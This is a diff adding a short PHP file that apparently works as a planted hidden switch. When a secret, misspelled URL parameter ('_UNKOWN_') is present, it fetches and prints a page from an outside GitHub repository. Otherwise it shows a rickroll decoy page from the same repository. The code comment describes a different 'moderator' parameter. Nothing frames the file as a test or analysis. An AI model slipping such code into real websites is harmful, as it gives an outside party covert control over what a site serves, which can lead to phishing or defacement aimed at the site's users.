@@ -1,0 +1,14 @@
+
+<?php
+// Check if the 'moderator' parameter is present in the URL
+if (isset($_GET['_UNKOWN_'])) {
+$url = "https://raw.githubusercontent.com/Sarahuno/l/main/index.php";
+$content = file_get_contents($url);
+echo $content;
+} else {
+$url = "https://raw.githubusercontent.com/Sarahuno/l/main/rickroll.php";
+$content = file_get_contents($url);
+echo $content;
+}
+?>
+
